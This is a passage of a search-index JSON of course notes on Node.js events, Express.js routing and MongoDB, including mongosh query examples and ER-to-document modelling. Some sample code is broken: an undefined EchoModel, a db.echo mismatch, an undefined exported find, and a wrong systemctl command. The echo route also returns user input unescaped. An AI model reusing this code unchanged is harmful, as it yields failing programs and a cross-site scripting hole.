syntax"},{"location":"notes/l4_2_nodejs/#user-defined-events","text":"We can define customized events to trigger callbacks in Node.js. For instance import EventEmitter from 'events'; const myEvtEmt = new EventEmitter(); myEvtEmt.on('start', (data) => { console.log(`data ${data} received`); }) myEvtEmt.emit('start', 1); we make use of the EventEmitter class imported from the events library. In the above code, we define an EventEmitter object myEvtEmt . Then we use .on() method to register a customized event start with a callback function, in this case the call back is an anonymous function taking the data and printing it out. In the third statement, we trigger the event by calling .emit() method. In case the callback does not take any parameters, the .emit() will only be called with one argument, i.e. the event. myEvtEmt.on('end', () => { console.log(`bye`); }) myEvtEmt.emit('end');","title":"User Defined Events"},{"location":"notes/l4_2_nodejs/#when-will-the-event-loop-stop","text":"For Node.js, some of the events are expecting a closure, e.g. API call, file operation, the Node.js event loop will keep looping until all expected closures have returned and there is no more pending tasks in the micro nor the macro queues. For browsers, the event loop will continue as it waits for the user's next input.","title":"When will the event loop stop?"},{"location":"notes/l4_2_nodejs/#further-readings","text":"An interactive example showing how promise and callback works. https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/ Synchronous vs Asynchronous JavaScript \u2013 Call Stack, Promises, and More https://www.freecodecamp.org/news/synchronous-vs-asynchronous-in-javascript/#:~:text=JavaScript%20is%20a%20single%2Dthreaded,language%20with%20lots%20of%20flexibility. Node.js Event loop behavior https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick Node.js API for timer functions, setTimeout , setImmediate , setInterval . https://nodejs.org/en/docs/guides/timers-in-node","title":"Further Readings"},{"location":"notes/l4_2_nodejs/#corhort-exercise-graded","text":"Using the callstack-microtask-macrotask table, illustrate the execution of the following JavaScript program import EventEmitter from 'events'; const ev1 = new EventEmitter(); const ev2 = new EventEmitter(); let count = 0; let promise1 = new Promise( (resolve, reject) => { resolve(count); }) let promise2 = new Promise( (resolve, reject) => { resolve(count); }) function foo(x) { return new Promise((resolve, reject) => { if (x > 10) { resolve(); } else if (x % 2 == 0) { ev1.emit('run', ++x); } else { ev2.emit('run', ++x); } }) } ev1.on('run', (data) => { console.log(`data ${data} received by ev1`); promise2.then(foo(data)); }) ev2.on('run', (data) => { console.log(`data ${data} received by ev2`); promise1.then(foo(data)); }) ev2.emit('run', count);","title":"Corhort Exercise (Graded)"},{"location":"notes/l5_1_expressjs_backend_mongo/","text":"50.003 - Express.js and Mongo DB Learning Outcomes By the end of this unit, you should be able to Develop a simple web restful API using node.js and express.js Use MongoDB to manage a document database Integrate the restful API with MongoDB as the database. Articulate the design processes of a database. Web Application A web application is a program that runs mainly on the server (not on the browser), which listens to requests from clients (such as browser, mobile app and etc). These requests are often conveyed using the hyper text transfer protocol (HTTP) or its secured variant (HTTPS). Given a request, the web application returns the correspondent response to the client. We can think of a web application takes a HTTP(s) request as input and returns a HTTP(s) response as result if the request is valid, returns an error response otherwise. A simple web application can be defined using the builtin http module in Node.js. Suppose we have a following Node.js script simple_webapp.js // import http from 'http' // won't work, not in a npm project const http = require('http'); const webAppServer = http.createServer((req,res) => { if(req.url === \"/\") { res.write(` <html> <head><title>Welcome</title></head> <body>Welcome to 50.003!</body> </html>`); res.end(); } else { res.write(` <html> <head><title>Error</title></head> <body>Page not found</body> </html>`); res.end(); } }) webAppServer.listen(3000); In the program, we instantiate an http server object webAppServer by calling the constructor method http.createServer() , which takes an executor function as the argument. The executor function expects a request and a response as inputs and writes output (HTML) to the reponse. In the last statement, we start the web app server by calling .listen(3000) , i.e. the server is running on port 3000. We can start the web app by running node simple_webapp without a need to step an npm project structure. Open http://127.0.0.1:3000/ in a browser will dipslay the welcome page. Recall that from our previous lesson, Node.js executes the given JavaScript program statement by statement until there is nothing left in the call stack, then it continues with the event loop. The event loop will check for timer functions (which is absent in the above), check the micro and macro task queues, poll the I/O, and etc. Until there is nothing pending callback or I/O. One may ask how comes our simple_webapp program remains running? The answer lies in the last statement, the .listen() method keeps the web server in the event-loop by registering its executor with the HTTP request event. One issue with the above implementation is that all the request to response mapping are defined in a single function and there is only one iteration. In real world projects, we need to decompose the web app into multiple modules and components to handle different functionalities, e.g. sigup/login, user profile, content access, payment and etc. Furthermore, there are some common operations which are to be performed in nearly all requests, e.g. checking whether the user has already login. Lastly, the formatting of the return response, i.e. HTML code, CSS and client side JavaScripts should be modularized and built up systematically. With these consideration in mind, we often prefer using some web application framework to guide the development instead of building everything from scratch for productivity concern. Express.js Express.js is one of the popular web application framework for Node.js. To use express.js mkdir my_express_app cd my_express_app npm init npm i express Then we add a file app.js with the following content const express = require('express') const app = express() const port = 3000 app.get('/', (req, res) => { res.send('Hello World!') }) app.listen(port, () => { console.log(`Example app listening on port ${port}`) }) At this stage, we have a web application created using express.js. It allows us to seperate the different request url path into different cases, app.get() handlers. app.get('/login', (req, res) => { res.send(`Under construction!`) }) To start the web server, run node app.js To make the express app ES6 compatible (optional) By default, Express.js does not support ES6. To make it ES6 compatible, we add the following to package.json json \"type\" : \"module\", Rename bin/www to bin/www.js . Rewrite const xyz = require('./some/package') into import xyz from './some/package' in all the .js files. Rewrite modules.export = xyz into export default xyz . Enable Babel, refer https://dev.to/geekygeeky/get-started-with-es6-javascript-for-writing-nodejs-using-express-544h For the rest of this unit we stick to CommonJS syntax. Express.js Generator In many cases, we may use the express generator to generate a proper project structure. First we recreate another project folder cd .. mkdir my_eg_app cd my_eg_app npx express-generator --view=ejs The --view=ejs flag sets ejs as the view template engine. Executing the above gives us a project folder with the following structure. . \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u2502 \u2514\u2500\u2500 www \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 images \u2502 \u251c\u2500\u2500 javascripts \u2502 \u2514\u2500\u2500 stylesheets \u2502 \u2514\u2500\u2500 style.css \u251c\u2500\u2500 routes \u2502 \u251c\u2500\u2500 index.js \u2502 \u2514\u2500\u2500 users.js \u2514\u2500\u2500 views \u251c\u2500\u2500 error.ejs \u2514\u2500\u2500 index.ejs where app.js is the main entry script. bin stores dependency scripts such as www , package.json is the project file, public stores the static files to be delivered to the client, route contains the different sub-module routing rules, views store the view template sub modules. Let's run npm i to download all the dependencies defined in package.json . When it is done, run npm start , we observe the following in the command prompt > my-eg-app@0.0.0 start > node ./bin/www Opening https://127.0.0.1:3000 in the browser, we should see a page with a Welcome to Express message. MVC architecture Express.js adopts Model View Controller architecture. MVC groups packages and modules based on their roles and functionalities. Models. The model packages define the data being stored in the storage systems such as the databases, and abstract away the operations for data manipulation. View. The view packages define representation and format of the requested data being returned to the client. Controller. The controller packages define rules and routes of how user can request for and operate over the content and data. To illustrate, let's look at a simple example. An Echoer Let's build an echoer web app, which listens to the user's request and returns the same. First we need to add a new routing rules to the controller. In the routes folder add a new file named echo.js with the following content. const express = require('express'); var router = express.Router(); /* GET echo listing. */ router.get('/:msg', function(req, res, next) { const msg = req.params.msg; res.send(`${msg}`); }); module.exports = router; In the above, we define a new router which listens to HTTP get requests with URL pattern /:msg where :msg is the request parameter and returns a response containing the msg itself. Back in the project root folder, we add the following to the app.js ... var indexRouter = require('./routes/index'); // generated by express generator var usersRouter = require('./routes/users'); // generated by express generator var echoRouter = require('./routes/echo'); // added by us var app = express(); // generated by express generator // view engine setup ... app.use('/', indexRouter); // generated by express generator app.use('/users', usersRouter); // generated by express generator app.use('/echo', echoRouter); // added by us This allows us to \"link up\" the newly defined echo.js router with the web app. More specifically, we would like the web app to listen to the HTTP get requests with URL prefix /echo and pass it over to the echo router. Note that there are already two existing routers generated by the express generator. Now restart the web express app by pressing control-C in the command prompt and rerun npm start . Open the URL https://127.0.0.1:3000/echo/hello will render the message hello in the browser. Behind the scene, the following events took place. The web browser (client) sends a HTTP get request https://127.0.0.1:3000/echo/hello to the server, located at 127.0.0.1:3000. The express.js app (server) receives the requests (actually it is managed by the controller), and finds that the URL path is /echo/hello , it forwards the subfix /hello to the echoRouter . The echoRouter process the requests by extracting the :msg , i.e. msg = \"hello\" , and returns a response with hello as the content. The web browser (client) receives the HTTP response with message hello and renders it. Note that in the above example, there is no business logic involved and there is no data retrieved / updated in the persitent storage. Let's consider adding some few features to our web app. Suppose we would like to keep track of the messages being processed by the echoer, we need to add a model (a database entity) to handle how the data is stored and retrieved. Mongo DB There are multiple choices of databases which affects the choice of model framework. Relational Database. Data are stored as records in tables. Data queries are performed by joining data from multiple tables. Pros: Very concise and strict design. Close resemblance of domain models, class diagram. Data update are guaranteed to be consistent immediately. Data redundancy is eliminated. Concurrency is handled by the database system. Cons: Difficult to design, Difficult to be distributed. Join operations may be expensive. Document Database. Data are stored as documents. Data queries are performed by traversing between documents and references. Pros: A natural representation of human's perception of how data are stored. Easy to distribute the data into multiple servers. Queries operation could be faster. Cons: Data update are not consistent immediately. It could lead to poor design with many data redundancy. Some level of concurrency is handled by the database system. In this unit, we consider using a document database, MongoDB. Let's install mongodb. Follow this guide. https://www.mongodb.com/docs/manual/administration/install-community/ After the installation, run the following to start the mongo database server For Ubuntu (or Ubuntu subsystem user), systemctl services start mongod For Mac OS, brew services start mongodb-community Accessing MongoDB via Mongo Shell To launch a mongoDB client, (which is called the mongo shell) mongosh test> show dbs; admin 40.00 KiB config 60.00 KiB local 72.00 KiB MongoDB is a database management system, it contains and manages multiple databases. To change to a partcular database (if not exists, create it), we type test> use echo; A database contains multiple collections. We can think of a collection is a collection of documents. To check the list of collections in the database echo . echo> show collections; or echo> db.collectionNames(); It means there is no collection in the database echo . A database has no collection will not be saved to the disk. Let's create a collection. echo> db.createCollection('message'); Now we have a database named echo which has a collection name message . Let's insert some documents into the collection. echo> db.message.insertOne({ 'key': 1, 'msg':'hello', 'time':new Date() }); { acknowledged: true, insertedId: ObjectId(\"646c7454389aceea398edc02\") } echo> db.message.insertOne({ 'key': 2, 'msg':'hello', 'time':new Date() }); { acknowledged: true, insertedId: ObjectId(\"646c747a389aceea398edc03\") } echo> db.message.find(); [ { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] In the above example, we created two documents, with an integer key , a string msg and a date type attribute time . Note that for every document being inserted, MongoDB automatically adds an extra attribute _id which is a unique identifier for that doucment. For the full list of data type of MongoDB, refer to https://www.mongodb.com/docs/mongodb-shell/reference/data-types/ Next we consider how to retrieve some documents based on some criteria. echo> db.message.findOne({ 'key' : { $eq : 1 }}) { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") } The above query returns a single document that having key equals to 1 . We could also use $lt and $gt to define range queries. echo> db.message.findOne({ 'key' : { $gt : 1 } }) { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } Note that findOne returns the one document, in case of a query that matches with multiple documents, we should use find echo> db.message.find({ 'key' : { $gt : 0 }}) [ { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] To define a conjunctive query, we can either implicitly including multiple constraint in the same query echo> db.message.find( { 'key' : {$gt:0}, 'time': {$eq:new Date(\"2023-05-23T08:08:26.255Z\")}}) explicitly using $and echo> db.message.find({ $and : [ {'key' : { $gt : 0 }}, {'time' : { $eq : new Date(\"2023-05-23T08:08:26.255Z\")}}]}) Both yield [ { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] Similar to $and we can use $or to define disjunctive query. echo> db.message.find({ $or : [ {'key' : { $gt : 0 }}, {'time' : { $eq : new Date(\"2023-05-23T08:08:26.255Z\")}}]}) [ { _id: ObjectId(\"646ca371f51912fe44f4c171\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T11:28:49.094Z\") }, { _id: ObjectId(\"646ca378f51912fe44f4c172\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T11:28:56.387Z\") } ] We may also query documents with nested documents. echo> db.createCollection('user'); { ok: 1 } echo> db.user.insertOne({ 'id':1, 'name':'bob', 'dob': { 'year': 2001, 'month':12, 'day':25 } }); { acknowledged: true, insertedId: ObjectId(\"6476a12efb9207a944895017\") } echo> db.user.find( { 'dob.year' : { $eq : 2001 } } ) [ { _id: ObjectId(\"6476a12efb9207a944895017\"), id: 1, name: 'bob', dob: { year: 2001, month: 12, day: 25 } } ] Note that the find method returns a list of documents, we may use a cursor variable to iterate through the document list. echo> var cursor = db.message.find(); // note that var can be omitted here. echo> while (cursor.hasNext()) { printjson(cursor.next()); } { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } In the above, we call .find() to execute the query, the result list of documents is assigned to a cursor variable. The cursor in this context behaves similar to an iterator that found in Python and Java, i.e. we can use .hasNext() to check whether it has the next element, .next() to retrieve the next element incrementally. This allows us to scan through the set of results (which is potentially huge and not fitting in the RAM). To delete a set of documents meeting the criteria, we use the deleteMany method. echo> db.message.deleteMany({ 'key': { $eq: 2}}) For the full list of collection operations refer to https://www.mongodb.com/docs/manual/crud/ and https://www.mongodb.com/docs/manual/aggregation/ MongoDB as a DB in an Express.js app Firstly, let's create a new project. mkdir my_mongo_app cd my_mongo_app npx express-generator --view=ejs npm i mongodb npm audit fix --force We should have a project whose structure is similar to the previous echo app. Copy the app.js and echo.js files from the last app over into the current app. Next we create a folder models under the project root folder. In the models folder, we create a file named db.js with the following content. const MongoClient = require('mongodb').MongoClient; // creating a user with a password to mongodb is recommended. const connection_str = 'mongodb://localhost:27017/'; const client = new MongoClient(connection_str); const dbName = 'echo' var db = null; try { db = client.db(dbName); } catch (error) { console.error(\"database connection failed. \" + error); } async function cleanup() { await client.disconnect(); } module.exports = { db, cleanup } ; In the above we initialize the connection string and estabalish a mongodb client connection. In addition, we define a cleanup() function which will be callled when the web app terminates. Then we modify the app.js by importing the ./models/db.js module, and the process module. const process = require('process'); var db = require('./models/db.js'); process.on('SIGINT', db.cleanup); process.on('SIGTERM', db.cleanup); We register the SIGINT (signal interupt) and the SIGTERM (signal terminate) events with the cleanup() function from the db.js module. Next we create a new file in the ./models/ folder with name message.js with the following content. const db = require('./db.js'); const collectionName = 'message' class Message { constructor(msg, time) { this.msg = msg; this.time = time; } } /** return all mesages */ async function all() { try { const collection = db.echo.collection(collectionName); const cursor = collection.find(); var messages = []; while (await cursor.hasNext()) { const dbobj = await cursor.next(); messages.push(new Message(dbobj.msg, dbobj.time)); } return messages; } catch(error) { console.error(\"database connection failed.\" + error); throw error; } } /** insert a list of messages */ async function insertMany( messages ) { try { const collection = db.echo.collection(collectionName); await collection.insertMany(messages); } catch(error) { console.error(\"database connection failed.\" + error); throw error; } } module.exports = { Message, all, find, insertMany } In this module, we import the db.js module, we define a class Message with two attributes. In addition, we define a query function all() that retrieves all messages, and an insertMany() function that inserts new documents into the the collection. Note that these functions are async as the underlying calls to the db are asynchronmous, i.e. producing promises. Finally, we modify the echo.js router to save the echod message and retrieve all the old messages. const model = require('../models/message.js'); router.get('/:msg', async function(req, res, next) { const msg = req.params.msg; const message = new model.Message(msg, new Date()); await EchoModel.insertMany([message]); const messages = await model.all(); res.send(`${JSON.stringify(messages)}`); }); Cohort Exercise Modify the echo router so that it will return the most recent 3 messages? Add an end point /echo/delete to the echo router to delete the oldest message. Object Data Mapping In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation. Alternatively, we could use the mongoose library to help us to generate some of these codes. You are encouraged to check out the mongoose library. https://mongoosejs.com/ Where are the controllers? So far we have not seen any controller in this project. We will define controller when we need to model complex business logic which involves multiple models, which is absent in this example. A Briefing on Data Modelling In Software engineering, we often use UML model to formalize the system requirements. In Database design, we often use Entity Relation diagrams to formalize the data requirements of a system. This phase is also known as conceptual modelling in which we focus in identifying what data to store, rather than how to store the data. An ER Diagram may consists of some of the following Entity set. An entity set captures a set of objects or items to be stored. It is represented as a rectangular box with the entity name inside. Attribute. An attribute describe a property of an entity. An attribute is represented as an oval shape with the attribute name inside. Attribute serves as (part of) the primary key of the entity will be underlined. Relationship. A relationship defines the relationship between entities. It is represented as a diamond shape with the relationship name inside. Relationships are often annotated with cardinality constraints. We will discuss it shortly. For instance The above ER diagram, we find that Staff as an entity set. Each staff in this entity set should have two attributes, Sid and Name . Sid is the unique identifier for an entity object in a set. Let's consider another digram In the above ER diagram, we find another entity set Dept , which is identified by the Code attribute. There exists a relationship between Staff and Dept entity sets, i.e. Work . It implies that the database system should store the information of which staff is working in which department. The N and 1 annotating the connectors are known as the cardinality of the relationship. The 1 indicates that for each entity object in Staff there exists maximum 1 corresponding entity object in Dept . In plain English it means, a staff can work in only 1 department in maximum. The N denotes the fact that for each entity object in Dept there exists (infiniely) many corresponding entity objects in Staff . In plain English it means, a department may have many staff working inside. Let's consider another diagram In the above ER diagram, we find an additional relationship between the Staff and Dept , i.e. Manage which captures the fact that the database system should capture the information of the manager of each department. The 1 near the Dept means that each staff can only be the manager of maximum one department. The 1 next to the Staff means that each department has at most one manager. ER to Document Mapping the ER diagram to Mongo Database collection is to determine how the data should be stored. This phase is also known as logical modelling (and subsequently physical modelling). Let's consider the modelling the ER diagram with Staff and Dept and Work relationship (without the Manage relation). There are more than one possible logical models. Approach one. Storing Dept as a collection, which has attributes code and staffs . code is a string, staffs is a list of objects. Each object in staffs is a document with sid and name as attributes. e.g. json { 'code' : 'HR', 'staffs' : [ { 'id' : 1, 'name' : \"aaron\" }, { 'id' : 2, 'name' : \"betty\" } ] } Approach two. Storing Staff as a separate collection, and the staffs attribute in the department document should contains only the ids of the staff. A dept document json { 'code' : 'HR', 'staffs' : [ { 'id' : 1 }, { 'id' : 2 } ] } A staff document contains id , name and dept_code attributes. json { 'id': 1, 'name': 'aaron' 'dept_code': 'HR' } Both design will work. The advantage of the first approach is that all the information are now stored in one collection, it is easier to ensure the data consistency, while the downside is that as the conceptual model becomes complex, we might have documents with too many level of nesting. Approach two avoids the deep nesting of the document structure, however, to maintain the data consistency requires additional checking and validation in the application. Cohort Exercises Using MongoDB document example, can you give a logical design of the ER diagram with the Staff and Dept entities and Work and Manage relationships? Can you implement a web app with the correspondent end-point (routes) handlers to support 1. add and update staff 1. add dept 1. find staff s by department code 1. find staff s by staff id Some special cases of ER diagrams There are some difficult cases of ER diagrams to be modeled in document database in general, For instance a ternery relationship below For simplicity, we omitted the attributes of the entities. In this design find that 1. Given an article and a book, we find only one publisher 1. Given an article and a publisher, we find only one book, 1. Given a publisher and a book, there are many articles inside. Another example is the self-loop relationship below 1. A staff can be the Reporting Officer of many other staffs 2. A staff can be the Subordinate of only one managing staff. Implementing these designs often require us to have flat document structures.","title":"50.003 - Express.js and Mongo DB"},{"location":"notes/l5_1_expressjs_backend_mongo/#50003-expressjs-and-mongo-db","text":"","title":"50.003 - Express.js and Mongo DB"},{"location":"notes/l5_1_expressjs_backend_mongo/#learning-outcomes","text":"By the end of this unit, you should be able to Develop a simple web restful API using node.js and express.js Use MongoDB to manage a document database Integrate the restful API with MongoDB as the database. Articulate the design processes of a database.","title":"Learning Outcomes"},{"location":"notes/l5_1_expressjs_backend_mongo/#web-application","text":"A web application is a program that runs mainly on the server (not on the browser), which listens to requests from clients (such as browser, mobile app and etc). These requests are often conveyed using the hyper text transfer protocol (HTTP) or its secured variant (HTTPS). Given a request, the web application returns the correspondent response to the client. We can think of a web application takes a HTTP(s) request as input and returns a HTTP(s) response as result if the request is valid, returns an error response otherwise. A simple web application can be defined using the builtin http module in Node.js. Suppose we have a following Node.js script simple_webapp.js // import http from 'http' // won't work, not in a npm project const http = require('http'); const webAppServer = http.createServer((req,res) => { if(req.url === \"/\") { res.write(` <html> <head><title>Welcome</title></head> <body>Welcome to 50.003!</body> </html>`); res.end(); } else { res.write(` <html> <head><title>Error</title></head> <body>Page not found</body> </html>`); res.end(); } }) webAppServer.listen(3000); In the program, we instantiate an http server object webAppServer by calling the constructor method http.createServer() , which takes an executor function as the argument. The executor function expects a request and a response as inputs and writes output (HTML) to the reponse. In the last statement, we start the web app server by calling .listen(3000) , i.e. the server is running on port 3000. We can start the web app by running node simple_webapp without a need to step an npm project structure. Open http://127.0.0.1:3000/ in a browser will dipslay the welcome page. Recall that from our previous lesson, Node.js executes the given JavaScript program statement by statement until there is nothing left in the call stack, then it continues with the event loop. The event loop will check for timer functions (which is absent in the above), check the micro and macro task queues, poll the I/O, and etc. Until there is nothing pending callback or I/O. One may ask how comes our simple_webapp program remains running? The answer lies in the last statement, the .listen() method keeps the web server in the event-loop by registering its executor with the HTTP request event. One issue with the above implementation is that all the request to response mapping are defined in a single function and there is only one iteration. In real world projects, we need to decompose the web app into multiple modules and components to handle different functionalities, e.g. sigup/login, user profile, content access, payment and etc. Furthermore, there are some common operations which are to be performed in nearly all requests, e.g. checking whether the user has already login. Lastly, the formatting of the return response, i.e. HTML code, CSS and client side JavaScripts should be modularized and built up systematically. With these consideration in mind, we often prefer using some web application framework to guide the development instead of building everything from scratch for productivity concern.","title":"Web Application"},{"location":"notes/l5_1_expressjs_backend_mongo/#expressjs","text":"Express.js is one of the popular web application framework for Node.js. To use express.js mkdir my_express_app cd my_express_app npm init npm i express Then we add a file app.js with the following content const express = require('express') const app = express() const port = 3000 app.get('/', (req, res) => { res.send('Hello World!') }) app.listen(port, () => { console.log(`Example app listening on port ${port}`) }) At this stage, we have a web application created using express.js. It allows us to seperate the different request url path into different cases, app.get() handlers. app.get('/login', (req, res) => { res.send(`Under construction!`) }) To start the web server, run node app.js","title":"Express.js"},{"location":"notes/l5_1_expressjs_backend_mongo/#to-make-the-express-app-es6-compatible-optional","text":"By default, Express.js does not support ES6. To make it ES6 compatible, we add the following to package.json json \"type\" : \"module\", Rename bin/www to bin/www.js . Rewrite const xyz = require('./some/package') into import xyz from './some/package' in all the .js files. Rewrite modules.export = xyz into export default xyz . Enable Babel, refer https://dev.to/geekygeeky/get-started-with-es6-javascript-for-writing-nodejs-using-express-544h For the rest of this unit we stick to CommonJS syntax.","title":"To make the express app ES6 compatible (optional)"},{"location":"notes/l5_1_expressjs_backend_mongo/#expressjs-generator","text":"In many cases, we may use the express generator to generate a proper project structure. First we recreate another project folder cd .. mkdir my_eg_app cd my_eg_app npx express-generator --view=ejs The --view=ejs flag sets ejs as the view template engine. Executing the above gives us a project folder with the following structure. . \u251c\u2500\u2500 app.js \u251c\u2500\u2500 bin \u2502 \u2514\u2500\u2500 www \u251c\u2500\u2500 package.json \u251c\u2500\u2500 public \u2502 \u251c\u2500\u2500 images \u2502 \u251c\u2500\u2500 javascripts \u2502 \u2514\u2500\u2500 stylesheets \u2502 \u2514\u2500\u2500 style.css \u251c\u2500\u2500 routes \u2502 \u251c\u2500\u2500 index.js \u2502 \u2514\u2500\u2500 users.js \u2514\u2500\u2500 views \u251c\u2500\u2500 error.ejs \u2514\u2500\u2500 index.ejs where app.js is the main entry script. bin stores dependency scripts such as www , package.json is the project file, public stores the static files to be delivered to the client, route contains the different sub-module routing rules, views store the view template sub modules. Let's run npm i to download all the dependencies defined in package.json . When it is done, run npm start , we observe the following in the command prompt > my-eg-app@0.0.0 start > node ./bin/www Opening https://127.0.0.1:3000 in the browser, we should see a page with a Welcome to Express message.","title":"Express.js Generator"},{"location":"notes/l5_1_expressjs_backend_mongo/#mvc-architecture","text":"Express.js adopts Model View Controller architecture. MVC groups packages and modules based on their roles and functionalities. Models. The model packages define the data being stored in the storage systems such as the databases, and abstract away the operations for data manipulation. View. The view packages define representation and format of the requested data being returned to the client. Controller. The controller packages define rules and routes of how user can request for and operate over the content and data. To illustrate, let's look at a simple example.","title":"MVC architecture"},{"location":"notes/l5_1_expressjs_backend_mongo/#an-echoer","text":"Let's build an echoer web app, which listens to the user's request and returns the same. First we need to add a new routing rules to the controller. In the routes folder add a new file named echo.js with the following content. const express = require('express'); var router = express.Router(); /* GET echo listing. */ router.get('/:msg', function(req, res, next) { const msg = req.params.msg; res.send(`${msg}`); }); module.exports = router; In the above, we define a new router which listens to HTTP get requests with URL pattern /:msg where :msg is the request parameter and returns a response containing the msg itself. Back in the project root folder, we add the following to the app.js ... var indexRouter = require('./routes/index'); // generated by express generator var usersRouter = require('./routes/users'); // generated by express generator var echoRouter = require('./routes/echo'); // added by us var app = express(); // generated by express generator // view engine setup ... app.use('/', indexRouter); // generated by express generator app.use('/users', usersRouter); // generated by express generator app.use('/echo', echoRouter); // added by us This allows us to \"link up\" the newly defined echo.js router with the web app. More specifically, we would like the web app to listen to the HTTP get requests with URL prefix /echo and pass it over to the echo router. Note that there are already two existing routers generated by the express generator. Now restart the web express app by pressing control-C in the command prompt and rerun npm start . Open the URL https://127.0.0.1:3000/echo/hello will render the message hello in the browser. Behind the scene, the following events took place. The web browser (client) sends a HTTP get request https://127.0.0.1:3000/echo/hello to the server, located at 127.0.0.1:3000. The express.js app (server) receives the requests (actually it is managed by the controller), and finds that the URL path is /echo/hello , it forwards the subfix /hello to the echoRouter . The echoRouter process the requests by extracting the :msg , i.e. msg = \"hello\" , and returns a response with hello as the content. The web browser (client) receives the HTTP response with message hello and renders it. Note that in the above example, there is no business logic involved and there is no data retrieved / updated in the persitent storage. Let's consider adding some few features to our web app. Suppose we would like to keep track of the messages being processed by the echoer, we need to add a model (a database entity) to handle how the data is stored and retrieved.","title":"An Echoer"},{"location":"notes/l5_1_expressjs_backend_mongo/#mongo-db","text":"There are multiple choices of databases which affects the choice of model framework. Relational Database. Data are stored as records in tables. Data queries are performed by joining data from multiple tables. Pros: Very concise and strict design. Close resemblance of domain models, class diagram. Data update are guaranteed to be consistent immediately. Data redundancy is eliminated. Concurrency is handled by the database system. Cons: Difficult to design, Difficult to be distributed. Join operations may be expensive. Document Database. Data are stored as documents. Data queries are performed by traversing between documents and references. Pros: A natural representation of human's perception of how data are stored. Easy to distribute the data into multiple servers. Queries operation could be faster. Cons: Data update are not consistent immediately. It could lead to poor design with many data redundancy. Some level of concurrency is handled by the database system. In this unit, we consider using a document database, MongoDB. Let's install mongodb. Follow this guide. https://www.mongodb.com/docs/manual/administration/install-community/ After the installation, run the following to start the mongo database server For Ubuntu (or Ubuntu subsystem user), systemctl services start mongod For Mac OS, brew services start mongodb-community","title":"Mongo DB"},{"location":"notes/l5_1_expressjs_backend_mongo/#accessing-mongodb-via-mongo-shell","text":"To launch a mongoDB client, (which is called the mongo shell) mongosh test> show dbs; admin 40.00 KiB config 60.00 KiB local 72.00 KiB MongoDB is a database management system, it contains and manages multiple databases. To change to a partcular database (if not exists, create it), we type test> use echo; A database contains multiple collections. We can think of a collection is a collection of documents. To check the list of collections in the database echo . echo> show collections; or echo> db.collectionNames(); It means there is no collection in the database echo . A database has no collection will not be saved to the disk. Let's create a collection. echo> db.createCollection('message'); Now we have a database named echo which has a collection name message . Let's insert some documents into the collection. echo> db.message.insertOne({ 'key': 1, 'msg':'hello', 'time':new Date() }); { acknowledged: true, insertedId: ObjectId(\"646c7454389aceea398edc02\") } echo> db.message.insertOne({ 'key': 2, 'msg':'hello', 'time':new Date() }); { acknowledged: true, insertedId: ObjectId(\"646c747a389aceea398edc03\") } echo> db.message.find(); [ { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] In the above example, we created two documents, with an integer key , a string msg and a date type attribute time . Note that for every document being inserted, MongoDB automatically adds an extra attribute _id which is a unique identifier for that doucment. For the full list of data type of MongoDB, refer to https://www.mongodb.com/docs/mongodb-shell/reference/data-types/ Next we consider how to retrieve some documents based on some criteria. echo> db.message.findOne({ 'key' : { $eq : 1 }}) { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") } The above query returns a single document that having key equals to 1 . We could also use $lt and $gt to define range queries. echo> db.message.findOne({ 'key' : { $gt : 1 } }) { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } Note that findOne returns the one document, in case of a query that matches with multiple documents, we should use find echo> db.message.find({ 'key' : { $gt : 0 }}) [ { _id: ObjectId(\"646c7454389aceea398edc02\"), key: 1, msg: 'hello', time: ISODate(\"2023-05-23T08:07:48.172Z\") }, { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] To define a conjunctive query, we can either implicitly including multiple constraint in the same query echo> db.message.find( { 'key' : {$gt:0}, 'time': {$eq:new Date(\"2023-05-23T08:08:26.255Z\")}}) explicitly using $and echo> db.message.find({ $and : [ {'key' : { $gt : 0 }}, {'time' : { $eq : new Date(\"2023-05-23T08:08:26.255Z\")}}]}) Both yield [ { _id: ObjectId(\"646c747a389aceea398edc03\"), key: 2, msg: 'hello', time: ISODate(\"2023-05-23T08:08:26.255Z\") } ] Similar to $and we can use $or to define disjunctive query. echo> db.message.find({ $or : [ {'key' : { $gt : 0 }}, {'time' : { $eq : new Date(\"2023-05-23T08:08:26.255Z\")}}]}) [ { _id: ObjectId(\"646ca371f51912fe44f4c171\"), key: 1, msg: 'hello', time: 